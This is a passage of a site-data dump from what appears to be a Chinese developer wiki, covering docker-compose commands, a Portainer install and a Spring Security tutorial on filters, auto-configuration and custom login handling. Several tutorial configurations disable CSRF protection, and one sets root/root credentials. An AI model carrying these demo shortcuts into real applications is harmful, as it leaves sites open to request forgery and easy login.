命令所启动的容器，并移除网络\n\n----------------------------------------\n\n# exec\n\n * 进入指定的容器。\n\n----------------------------------------\n\n# ps\n\n格式为 docker-compose ps [options] [service...]。\n\n列出项目中目前的所有容器。\n\n选项：\n\n * -q 只打印容器的 id 信息。\n\n----------------------------------------\n\n# restart\n\n格式为 docker-compose restart [options] [service...]。\n\n重启项目中的服务。\n\n选项：\n\n * -t, --timeout timeout 指定重启前停止容器的超时（默认为 10 秒）。\n\n----------------------------------------\n\n# rm\n\n格式为 docker-compose rm [options] [service...]。\n\n删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。\n\n选项：\n\n * -f, --force 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n * -v 删除容器所挂载的数据卷。\n\n----------------------------------------\n\n# start\n\n格式为 docker-compose start [service...]。\n\n启动已经存在的服务容器。\n\n----------------------------------------\n\n# stop\n\n格式为 docker-compose stop [options] [service...]。\n\n停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器。\n\n选项：\n\n * -t, --timeout timeout 停止容器时候的超时（默认为 10 秒）。\n\n----------------------------------------\n\n# top\n\n查看各个服务容器内运行的进程。\n\n----------------------------------------\n\n# unpause\n\n格式为 docker-compose unpause [service...]。\n\n恢复处于暂停状态中的服务。\n\n----------------------------------------\n\n\n# docker可视化工具\n\n# 安装portainer\n\n官方安装说明：https://www.portainer.io/installation/\n\n[root@ubuntu1804 ~]#docker pull  portainer/portainer\n\n[root@ubuntu1804 ~]#docker volume create portainer_data\nportainer_data\n[root@ubuntu1804 ~]#docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer\n20db26b67b791648c2ef6aee444a5226a9c897ebcf0160050e722dbf4a4906e3\n[root@ubuntu1804 ~]#docker ps \ncontainer id        image                 command             created             status              ports                                            names\n20db26b67b79        portainer/portainer   "/portainer"        5 seconds ago       up 4 seconds        0.0.0.0:8000->8000/tcp, 0.0.0.0:9000->9000/tcp   portainer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 登录和使用portainer\n\n> 用浏览器访问：http://localhost:9000\n\n',charsets:{cjk:!0},lastUpdated:"2022/05/01, 06:34:13",lastUpdatedTimestamp:1651386853e3},{title:"Spring Security",frontmatter:{title:"Spring Security",date:"2022-04-24T09:00:00.000Z",permalink:"/dev/java/eco/springsecurity",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["SpringSecurity"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/01.SpringSecurity.html",relativePath:"01.开发/101.后端/1012.微服务生态/01.SpringSecurity.md",key:"v-7144078e",path:"/dev/java/eco/springsecurity/",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:86},{level:3,title:"权限管理",slug:"权限管理",normalizedTitle:"权限管理",charIndex:73},{level:3,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:991},{level:3,title:"历史",slug:"历史",normalizedTitle:"历史",charIndex:1160},{level:3,title:"整体架构",slug:"整体架构",normalizedTitle:"整体架构",charIndex:1923},{level:3,title:"认证原理",slug:"认证原理",normalizedTitle:"认证原理",charIndex:2061},{level:3,title:"授权原理",slug:"授权原理",normalizedTitle:"授权原理",charIndex:3830},{level:2,title:"HelloWorld",slug:"helloworld",normalizedTitle:"helloworld",charIndex:4582},{level:3,title:"环境搭建",slug:"环境搭建",normalizedTitle:"环境搭建",charIndex:4597},{level:3,title:"实现原理",slug:"实现原理",normalizedTitle:"实现原理",charIndex:5879},{level:2,title:"自定义认证",slug:"自定义认证",normalizedTitle:"自定义认证",charIndex:14689},{level:3,title:"自定义资源权限规则",slug:"自定义资源权限规则",normalizedTitle:"自定义资源权限规则",charIndex:14718},{level:3,title:"自定义认证页面",slug:"自定义认证页面",normalizedTitle:"自定义认证页面",charIndex:15812},{level:3,title:"自定义认证成功处理",slug:"自定义认证成功处理",normalizedTitle:"自定义认证成功处理",charIndex:14742},{level:3,title:"自定义认证失败处理",slug:"自定义认证失败处理",normalizedTitle:"自定义认证失败处理",charIndex:14755},{level:3,title:"自定义注销处理",slug:"自定义注销处理",normalizedTitle:"自定义注销处理",charIndex:14768},{level:3,title:"登陆成功后的信息获取",slug:"登陆成功后的信息获取",normalizedTitle:"登陆成功后的信息获取",charIndex:14779},{level:3,title:"自定义认证数据源",slug:"自定义认证数据源",normalizedTitle:"自定义认证数据源",charIndex:14793},{level:3,title:"验证码案例",slug:"验证码案例",normalizedTitle:"验证码案例",charIndex:39405},{level:2,title:"密码加密",slug:"密码加密",normalizedTitle:"密码加密",charIndex:52740},{level:2,title:"rememberMe",slug:"rememberme",normalizedTitle:"rememberme",charIndex:52749},{level:2,title:"会话管理",slug:"会话管理",normalizedTitle:"会话管理",charIndex:52764},{level:2,title:"CSRF",slug:"csrf",normalizedTitle:"csrf",charIndex:7053}],excerpt:'<h1 id="spring-security"><a class="header-anchor" href="#spring-security">#</a> Spring Security</h1>\n<blockquote>\n<p>Spring Security是一个功能强大、可高度定制的<code>身份验证</code>和<code>访问控制</code>的框架。或者说用来实现系统中权限管理的框架。</p>\n</blockquote>\n',headersStr:"概述 权限管理 简介 历史 整体架构 认证原理 授权原理 HelloWorld 环境搭建 实现原理 自定义认证 自定义资源权限规则 自定义认证页面 自定义认证成功处理 自定义认证失败处理 自定义注销处理 登陆成功后的信息获取 自定义认证数据源 验证码案例 密码加密 rememberMe 会话管理 CSRF",content:'# Spring Security\n\n> Spring Security是一个功能强大、可高度定制的身份验证和访问控制的框架。或者说用来实现系统中权限管理的框架。\n\n\n# 概述\n\n\n# 权限管理\n\n基本上涉及到用户参与的系统都要进行权限管理，权限管理属于系统安全的范畴，权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。\n\n权限管理包括用户身份认证和授权两部分，简称认证授权。对于需要访问控制的资源用户首先经过身份认证，认证通过后用户具有该资源的访问权限方可访问。\n\n# 认证\n\n身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。对于采用指纹等系统，则出示指纹；对于硬件Key等刷卡系统，则需要刷卡。\n\n# 授权\n\n授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n# 常见解决方案\n\n * Shiro\n   * Shiro 本身是一个老牌的安全管理框架，有着众多的优点，例如轻量、简单、易于集成、可以在JavaSE环境中使用等。不过，在微服务时代，Shiro 就显得力不从心了，在微服务面前和扩展方面，无法充分展示自己的优势。\n * 开发者自定义\n   * 也有很多公司选择自定义权限，即自己开发权限管理。但是一个系统的安全，不仅仅是登录和权限控制这么简单，我们还要考虑种各样可能存在的网络政击以及防彻策略，从这个角度来说，开发者白己实现安全管理也并非是一件容易的事情，只有大公司才有足够的人力物力去支持这件事情。\n * Spring Security\n   * Spring Security,作为spring 家族的一员，在和 Spring 家族的其他成员如 Spring Boot Spring Clond等进行整合时，具有其他框架无可比拟的优势，同时对 OAuth2 有着良好的支持，再加上Spring Cloud对 Spring Security的不断加持（如推出 Spring Cloud Security )，让 Spring Securiy 不知不觉中成为微服务项目的首选安全管理方案。\n\n\n# 简介\n\nSpring Security是一个功能强大、可高度定制的身份验证和访问控制框架。它是保护基于Spring的应用程序的事实标准。\n\nSpring Security是一个面向Java应用程序提供身份验证和安全性的框架。与所有Spring项目一样，Spring Security的真正威力在于它可以轻松地扩展以满足定制需求。\n\n\n# 历史\n\nSpring Security 最早叫 Acegi Security， 这个名称并不是说它和 Spring 就没有关系，它依然是为Spring 框架提供安全支持的。Acegi Security 基于 Spring，可以帮助我们为项目建立丰富的角色与权限管理系统。Acegi security 虽然好用，但是最为人诟病的则是它臃肿烦琐的配置这一问题最终也遗传给了 Spring Security。\n\nAcegi Security 最终被并入 Spring Security 项目中，并于 2008 年4月发布了改名后的第一个版本 Spring Security 2.0.0，到目前为止，Spring Security 的最新版本己经到了 5.6.1。和 Shiro 相比，Spring Security重量级并且配置烦琐，直至今天，依然有人以此为理由而拒绝了解 Spring Security。其实，自从 Spring Boot 推出后，就彻底颠覆了传统了 JavaEE 开发，自动化配置让许多事情变得非常容易，包括 Spring Security 的配置。在一个 Spring Boot 项目中，我们甚至只需要引入一个依赖，不需要任何额外配置，项目的所有接口就会被自动保护起来了。在 Spring Cloud中，很多涉及安全管理的问题，也是一个 Spring Security 依赖两行配置就能搞定，在和 Spring 家族的产品一起使用时，Spring Security 的优势就非常明显了。\n\n因此，在微服务时代，我们不需要纠结要不要学习 Spring Security，我们要考虑的是如何快速掌握Spring Security， 并且能够使用 Spring Security 实现我们微服务的安全管理。\n\n\n# 整体架构\n\n在Spring Security的架构设计中，认证Authentication和授权 Authorization是分开的，无论使用什么样的认证方式。都不会影响授权，这是两个独立的存在，这种独立带来的好处之一，就是可以非常方便地整合一些外部的解决方案。\n\n\n\n\n# 认证原理\n\n# AuthenticationManager\n\n在Spring Security中认证是由AuthenticationManager接口来负责的，接口定义为：\n\n\n\npublic interface AuthenticationManager { \n\tAuthentication authenticate(Authentication authentication) \n  \t\t\t\t\t\t\t\t\t\t\t\t\t\tthrows AuthenticationException;\n}\n\n\n1\n2\n3\n4\n\n * 返回 Authentication 表示认证成功\n * 返回 AuthenticationException 异常，表示认证失败。\n\nAuthenticationManager 主要实现类为 ProviderManager，在 ProviderManager 中管理了众多 AuthenticationProvider 实例。在一次完整的认证流程中，Spring Security 允许存在多个 AuthenticationProvider ，用来实现多种认证方式，这些 AuthenticationProvider 都是由 ProviderManager 进行统一管理的。\n\n\n\n# Authentication\n\n认证以及认证成功的信息主要是由 Authentication 的实现类进行保存的，其接口定义为：\n\n\n\npublic interface Authentication extends Principal, Serializable {\n\tCollection<? extends GrantedAuthority> getAuthorities();\n\tObject getCredentials();\n\tObject getDetails();\n\tObject getPrincipal();\n\tboolean isAuthenticated();\n\tvoid setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * getAuthorities 获取用户权限信息\n * getCredentials 获取用户凭证信息，一般指密码\n * getDetails 获取用户详细信息\n * getPrincipal 获取用户身份信息，用户名、用户对象等\n * isAuthenticated 用户是否认证成功\n\n# SecurityContextHolder\n\nSecurityContextHolder 用来获取登录之后用户信息。Spring Security 会将登录用户数据保存在 Session 中。但是，为了使用方便,Spring Security在此基础上还做了一些改进，其中最主要的一个变化就是线程绑定。当用户登录成功后,Spring Security 会将登录成功的用户信息保存到 SecurityContextHolder 中。SecurityContextHolder 中的数据保存默认是通过ThreadLocal 来实现的，使用 ThreadLocal 创建的变量只能被当前线程访问，不能被其他线程访问和修改，也就是用户数据和请求线程绑定在一起。当登录请求处理完毕后，Spring Security 会将 SecurityContextHolder 中的数据拿出来保存到 Session 中，同时将 SecurityContexHolder 中的数据清空。以后每当有请求到来时，Spring Security 就会先从 Session 中取出用户登录数据，保存到 SecurityContextHolder 中，方便在该请求的后续处理过程中使用，同时在请求结束时将 SecurityContextHolder 中的数据拿出来保存到 Session 中，然后将 Security SecurityContextHolder 中的数据清空。这一策略非常方便用户在 Controller、Service 层以及任何代码中获取当前登录用户数据。\n\n\n# 授权原理\n\n当完成认证后，接下米就是授权了。在 Spring Security 的授权体系中，有两个关键接口，\n\n# AccessDecisionManager\n\n> AccessDecisionManager (访问决策管理器)，用来决定此次访问是否被允许。\n\n\n\n# AccessDecisionVoter\n\n> AccessDecisionVoter (访问决定投票器)，投票器会检查用户是否具备应有的角色，进而投出赞成、反对或者弃权票。\n\n\n\nAccessDecisionVoter 和 AccessDecisionManager 都有众多的实现类，在 AccessDecisionManager 中会换个遍历 AccessDecisionVoter，进而决定是否允许用户访问，因而 AccesdDecisionVoter 和 AccessDecisionManager 两者的关系类似于 AuthenticationProvider 和 ProviderManager 的关系。\n\n# ConfigAttribute\n\n> ConfigAttribute，用来保存授权时的角色信息\n\n\n\n在 Spring Security 中，用户请求一个资源(通常是一个接口或者一个 Java 方法)需要的角色会被封装成一个 ConfigAttribute 对象，在 ConfigAttribute 中只有一个 getAttribute方法，该方法返回一个 String 字符串，就是角色的名称。一般来说，角色名称都带有一个 ROLE_ 前缀，投票器 AccessDecisionVoter 所做的事情，其实就是比较用户所具各的角色和请求某个 资源所需的 ConfigAtuibute 之间的关系。\n\n\n# HelloWorld\n\n\n# 环境搭建\n\n# 0. 创建Springboot web项目\n\n<parent>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-parent</artifactId>\n  <version>2.6.6</version>\n  <relativePath/> \x3c!-- lookup parent from repository --\x3e\n</parent>\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-thymeleaf</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. 编写Controller\n\npackage com.pwddd.springsecurity.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class HelloController {\n\n  @RequestMapping("hello")\n  public String hello(){\n    System.out.println("hello");\n    return "123";\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2. 测试访问\n\n\n\n# 3. 引入Spring Security依赖\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n# 4. 登陆验证\n\n登陆密码为控制台打印的密码，默认用户名为user。\n\n\n\n登陆之后，可以正常访问。\n\n\n\n问题：\n\n * 为什么引入 Spring Security 之后没有任何配置所有请求就要认证呢?\n\n * 在项目中明明没有登录界面，登录界面怎么来的呢？\n\n * 为什么使用 user 和 控制台密码 能登陆，登录时验证数据源存在哪里呢？\n\n\n# 实现原理\n\n# 架构图\n\n文档地址：https://docs.spring.io/spring-security/site/docs/5.5.4/reference/html5/#servlet-architecture\n\n虽然开发者只需要引入一个依赖，就可以让 Spring Security 对应用进行保护。Spring Security 又是如何做到的呢？\n\n在 Spring Security 中 认证、授权 等功能都是基于过滤器完成的。\n\n\n\n\n\n需要注意的是，默认过滤器并不是直接放在 Web 项目的原生过滤器链中，而是通过一个 FlterChainProxy 来统一管理。Spring Security 中的过滤器链通过 FilterChainProxy 嵌入到 Web项目的原生过滤器链中。FilterChainProxy 作为一个顶层的管理者，将统一管理 Security Filter。FilterChainProxy 本身是通过 Spring 框架提供的 DelegatingFilterProxy 整合到原生的过滤器链中。\n\n# Security Filters\n\n那么在 Spring Security 中给我们提供那些过滤器? 默认情况下那些过滤器会被加载呢？\n\n过滤器                                             过滤器作用                                       默认是否加载\nChannelProcessingFilter                         过滤请求协议 HTTP 、HTTPS                          NO\nWebAsyncManagerIntegrationFilter                将 WebAsyncManger 与 SpringSecurity 上下文进行集成   YES\nSecurityContextPersistenceFilter                在处理请求之前,将安全信息加载到 SecurityContextHolder 中    YES\nHeaderWriterFilter                              处理头信息加入响应中                                  YES\nCorsFilter                                      处理跨域问题                                      NO\nCsrfFilter                                      处理 CSRF 攻击                                  YES\nLogoutFilter                                    处理注销登录                                      YES\nOAuth2AuthorizationRequestRedirectFilter        处理 OAuth2 认证重定向                             NO\nSaml2WebSsoAuthenticationRequestFilter          处理 SAML 认证                                  NO\nX509AuthenticationFilter                        处理 X509 认证                                  NO\nAbstractPreAuthenticatedProcessingFilter        处理预认证问题                                     NO\nCasAuthenticationFilter                         处理 CAS 单点登录                                 NO\nOAuth2LoginAuthenticationFilter                 处理 OAuth2 认证                                NO\nSaml2WebSsoAuthenticationFilter                 处理 SAML 认证                                  NO\nUsernamePasswordAuthenticationFilter            处理表单登录                                      YES\nOpenIDAuthenticationFilter                      处理 OpenID 认证                                NO\nDefaultLoginPageGeneratingFilter                配置默认登录页面                                    YES\nDefaultLogoutPageGeneratingFilter               配置默认注销页面                                    YES\nConcurrentSessionFilter                         处理 Session 有效期                              NO\nDigestAuthenticationFilter                      处理 HTTP 摘要认证                                NO\nBearerTokenAuthenticationFilter                 处理 OAuth2 认证的 Access Token                  NO\nBasicAuthenticationFilter                       处理 HttpBasic 登录                             YES\nRequestCacheAwareFilter                         处理请求缓存                                      YES\nSecurityContextHolder<br />AwareRequestFilter   包装原始请求                                      YES\nJaasApiIntegrationFilter                        处理 JAAS 认证                                  NO\nRememberMeAuthenticationFilter                  处理 RememberMe 登录                            NO\nAnonymousAuthenticationFilter                   配置匿名认证                                      YES\nOAuth2AuthorizationCodeGrantFilter              处理OAuth2认证中授权码                              NO\nSessionManagementFilter                         处理 session 并发问题                             YES\nExceptionTranslationFilter                      处理认证/授权中的异常                                 YES\nFilterSecurityInterceptor                       处理授权相关                                      YES\nSwitchUserFilter                                处理账户切换                                      NO\n\n可以看出，Spring Security 提供了 30 多个过滤器。\n\n默认情况下Spring Boot 在对 Spring Security 进入自动化配置时，会创建一个名为 SpringSecurityFilerChain 的过滤器，并注入到 Spring 容器中，这个过滤器将负责所有的安全管理，包括用户认证、授权、重定向到登录页面等。具体可以参考WebSecurityConfiguration的源码:\n\n\n\n\n\n# Spring Security自动配置原理\n\nSpringBootWebSecurityConfiguration这个类是 spring boot 自动配置类，通过这个源码得知，默认情况下对所有请求进行权限控制：\n\n@Configuration(proxyBeanMethods = false)\n@ConditionalOnDefaultWebSecurity\n@ConditionalOnWebApplication(type = Type.SERVLET)\nclass SpringBootWebSecurityConfiguration {\n\t@Bean\n\t@Order(SecurityProperties.BASIC_AUTH_ORDER)\n\tSecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) \n    throws Exception {\n\t\t\thttp.authorizeRequests().anyRequest()\n      .authenticated().and().formLogin().and().httpBasic();\n\t\treturn http.build();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这就是为什么在引入 Spring Security 中没有任何配置情况下，请求会被拦截的原因\n\n\n\n进入ConditionalOnDefaultWebSecurity注解对应的类中，我们可以看出Security生效的条件是：\n\nclass DefaultWebSecurityCondition extends AllNestedConditions {\n\n\tDefaultWebSecurityCondition() {\n\t\tsuper(ConfigurationPhase.REGISTER_BEAN);\n\t}\n\n\t@ConditionalOnClass({ SecurityFilterChain.class, HttpSecurity.class })\n\tstatic class Classes {\n\n\t}\n\n\t@ConditionalOnMissingBean({ WebSecurityConfigurerAdapter.class, SecurityFilterChain.class })\n\tstatic class Beans {\n\t}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 条件一 classpath中存在 SecurityFilterChain.class, HttpSecurity.class\n * 条件二 没有自定义 WebSecurityConfigurerAdapter.class, SecurityFilterChain.class\n\n默认情况下，条件都是满足的。WebSecurityConfigurerAdapter 这个类极其重要，Spring Security 核心配置都在这个类中。如果要对 Spring Security 进行自定义配置，就要自定义这个类实例，通过覆盖类中方法达到修改默认配置的目的。\n\n\n\n# 流程分析\n\n\n\n 1. 请求 /hello 接口，在引入 spring security 之后会先经过一些列过滤器\n 2. 在请求到达 FilterSecurityInterceptor时，发现请求并未认证。请求拦截下来，并抛出 AccessDeniedException 异常。\n 3. 抛出 AccessDeniedException 的异常会被 ExceptionTranslationFilter 捕获，这个 Filter 中会调用 LoginUrlAuthenticationEntryPoint#commence 方法给客户端返回 302，要求客户端进行重定向到 /login 页面。\n 4. 客户端发送 /login 请求。\n 5. /login 请求会再次被拦截器中 DefaultLoginPageGeneratingFilter 拦截到，并在拦截器中返回生成登录页面。\n\n就是通过这种方式，Spring Security 默认过滤器中生成了登录页面，并返回！\n\n# 登陆信息校验原理\n\n 1. 查看 SpringBootWebSecurityConfiguration#defaultSecurityFilterChain 方法表单登录\n\n\n\n 2. 处理登录为 FormLoginConfigurer 类中 调用UsernamePasswordAuthenticationFilter这个类实例\n\n\n\n 3. 查看类中 UsernamePasswordAuthenticationFilter#attempAuthentication 方法得知实际调用 AuthenticationManager 中 authenticate 方法\n\n\n\n 4. 调用 ProviderManager 类中方法 authenticate\n\n\n\n 5. 调用了 ProviderManager 实现类中 AbstractUserDetailsAuthenticationProvider类中方法\n\n\n\n 6. 最终调用实现类 DaoAuthenticationProvider 类中方法比较\n\n\n\n\n\n看到这里就知道默认实现是基于 InMemoryUserDetailsManager 这个类,也就是内存的实现!\n\n通过源码分析也能得知UserDetailService是顶层父接口，接口中loadUserByUserName方法是用来在认证时进行用户名认证方法，默认实现使用是内存实现，如果想要修改数据库实现我们只需要自定义UserDetailService实现，最终返回 UserDetails实例即可。\n\n\n\n# UserDetailService自动配置\n\n@Configuration(proxyBeanMethods = false)\n@ConditionalOnClass(AuthenticationManager.class)\n@ConditionalOnBean(ObjectPostProcessor.class)\n@ConditionalOnMissingBean(\n\t\tvalue = { AuthenticationManager.class, AuthenticationProvider.class, UserDetailsService.class,\n\t\t\t\tAuthenticationManagerResolver.class },\n\t\ttype = { "org.springframework.security.oauth2.jwt.JwtDecoder",\n\t\t\t\t"org.springframework.security.oauth2.server.resource.introspection.OpaqueTokenIntrospector",\n\t\t\t\t"org.springframework.security.oauth2.client.registration.ClientRegistrationRepository" })\npublic class UserDetailsServiceAutoConfiguration {\n  //....\n  @Bean\n\t@Lazy\n\tpublic InMemoryUserDetailsManager inMemoryUserDetailsManager(SecurityProperties properties,\n\t\t\tObjectProvider<PasswordEncoder> passwordEncoder) {\n\t\tSecurityProperties.User user = properties.getUser();\n\t\tList<String> roles = user.getRoles();\n\t\treturn new InMemoryUserDetailsManager(\n\t\t\t\tUser.withUsername(user.getName()).password(getOrDeducePassword(user, passwordEncoder.getIfAvailable()))\n\t\t\t\t\t\t.roles(StringUtils.toStringArray(roles)).build());\n\t}\n  //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 1. 从自动配置源码中得知当 classpath 下存在 AuthenticationManager 类\n 2. 当前项目中，系统没有提供 AuthenticationManager.class、 AuthenticationProvider.class、UserDetailsService.class、 AuthenticationManagerResolver.class、实例\n\n默认情况下都会满足，此时Spring Security会提供一个 InMemoryUserDetailManager 实例\n\n\n\n熟悉Spring Boot的自动加载原理可以知道，往往一个Configuration都会对应一个Properties配置类，我们可以先看一下这个配置类：\n\n\n\n可以看出，我们如果需要自定义一些配置的话，使用的前缀是spring.security。拼接上对应的属性即可。\n\n@ConfigurationProperties(prefix = "spring.security")\npublic class SecurityProperties {\n\tprivate final User user = new User();\n\tpublic User getUser() {\n\t\treturn this.user;\n  }\n  //....\n\tpublic static class User {\n\t\tprivate String name = "user";\n\t\tprivate String password = UUID.randomUUID().toString();\n\t\tprivate List<String> roles = new ArrayList<>();\n\t\tprivate boolean passwordGenerated = true;\n\t\t//get set ...\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这就是默认生成 user 以及 uuid 密码过程! 另外看明白源码之后，就知道只要在配置文件中加入如下配置可以对内存中用户和密码进行覆盖。\n\nspring.security.user.name=root\nspring.security.user.password=root\nspring.security.user.roles=admin,users\n\n\n1\n2\n3\n\n\n# 总结\n\nAuthenticationManager、ProviderManger、以及 AuthenticationProvider 关系\n\n\n\nWebSecurityConfigurerAdapter 扩展 Spring Security 所有默认配置\n\n\n\nUserDetailService 用来修改默认认证的数据源信息\n\n\n\n\n# 自定义认证\n\n自定义认证这一部分包含以下的内容：\n\n * 自定义资源权限规则\n * 自定义认证界面\n * 自定义认证成功处理\n * 自定义认证失败处理\n * 自定义注销处理\n * 登陆成功后的信息获取\n * 自定义认证数据源\n * 基于Web的认证案例\n * 基于前后端分离的认证案例\n * 添加认证验证码\n\n\n# 自定义资源权限规则\n\n默认情况下，Spring Security对有所得页面做认证要求，我们可以使用自定义的资源权限规则针对不同的请求，设置不同的资源权限规则。\n\n自定义资源权限规则需要在Spring Security的配置文件中操作，配置文件需要继承WebSecurityConfigurerAdapter类，并重写其中的configure方法。如下所示：\n\npackage com.pwddd.springsecurity.config;\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/index")  // 添加匹配\n      .permitAll()  // 允许全部\n      .anyRequest()  // 任意请求\n      .authenticated()  // 需要认证\n      .and()  // 并且\n      .formLogin()  // 表单登陆\n      .and()  \n      .csrf().disable();  // 关闭csrf攻击保护\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 自定义认证页面\n\n默认提供的登陆页面是由DefaultLoginPageGeneratingFilter.class类在页面中提供的，默认的登陆请求地址为：/login。我们可以修改默认的登陆页面。\n\n# 0. 编写登陆页面\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Login</title>\n</head>\n<body>\n    <h2>登陆</h2>\n    <form th:action="@{/doLogin}" method="post">\n        用户名：<input type="text" name="uname" ><br>\n        密 码：<input type="password" name="passwd"/> <br>\n        <input type="submit" value="提交">\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 1. 设置到登录页面的路由\n\nregistry.addViewController("/login").setViewName("login");\n\n\n1\n\n\n# 2. 设置登录信息\n\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.authorizeRequests()\n    .mvcMatchers("/login").permitAll() // 必须放开当前登录页面的认证\n    .mvcMatchers("/index").permitAll()\n    .anyRequest()\n    .authenticated()\n    .and()\n    .formLogin()\n    .loginPage("/login")  // 设置登录页面\n    .loginProcessingUrl("/doLogin")  // 设置登录的请求地址\n    //.successForwardUrl("/hello")  // 设置成功后的转发地址\n    .defaultSuccessUrl("/hello")  // 设置成功重定向地址\n    .usernameParameter("uname")  // 设置请求用户名参数名\n    .passwordParameter("passwd") // 设置请求密码参数名\n    .and()\n    .csrf().disable();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nsuccessForwardUrl 、defaultSuccessUrl 这两个方法都可以实现成功之后跳转\n\n * successForwardUrl 默认使用 forward跳转 注意:不会跳转到之前请求路径\n * defaultSuccessUrl 默认使用 redirect 跳转 注意:如果之前请求路径,会有优先跳转之前请求路径,可以传入第二个参数进行修改\n\n\n# 自定义认证成功处理\n\n在前后端分离开发中，我们登陆成功后往往不是跳转到某个页面，而是返回前端一段json格式的数据。那么就不能使用转发或者重定向到一个地址。我们可以通过自定义的认证成功处理器实现AuthenticationSuccessHandler。\n\npublic interface AuthenticationSuccessHandler {\n\n\t/**\n\t * Called when a user has been successfully authenticated.\n\t * @param request the request which caused the successful authentication\n\t * @param response the response\n\t * @param authentication the <tt>Authentication</tt> object which was created during\n\t * the authentication process.\n\t */\n\tvoid onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response,\n\t\t\tAuthentication authentication) throws IOException, ServletException;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n根据接口的描述信息,也可以得知登录成功会自动回调这个方法，进一步查看它的默认实现，你会发现successForwardUrl、defaultSuccessUrl也是由它的子类实现的\n\n\n\n# 0. 自定义认证成功处理器\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.web.authentication.AuthenticationSuccessHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("msg","登陆成功！");\n        hashMap.put("code",200);\n        response.setContentType("application/json;charset=utf8");\n        String result = new ObjectMapper().writeValueAsString(hashMap);\n        response.getWriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. 配置自定义处理器\n\n.successHandler(new CustomerAuthenticationSuccessHandler())\n\n\n1\n\n\n这样配置之后，登陆成功就会使用我们指定的认证成功处理器。\n\n\n\n\n# 自定义认证失败处理\n\n# 页面展示失败信息\n\n为了能更直观在登录页面看到异常错误信息，可以在登录页面中直接获取异常信息。Spring Security 在登录失败之后会将异常信息存储到 request 、session作用域中 key 为 SPRING_SECURITY_LAST_EXCEPTION 命名属性中，源码可以参考 SimpleUrlAuthenticationFailureHandler ：\n\n\n\n我们可以在登录失败跳转页面上获取登录失败信息，然后展示到页面。\n\n# 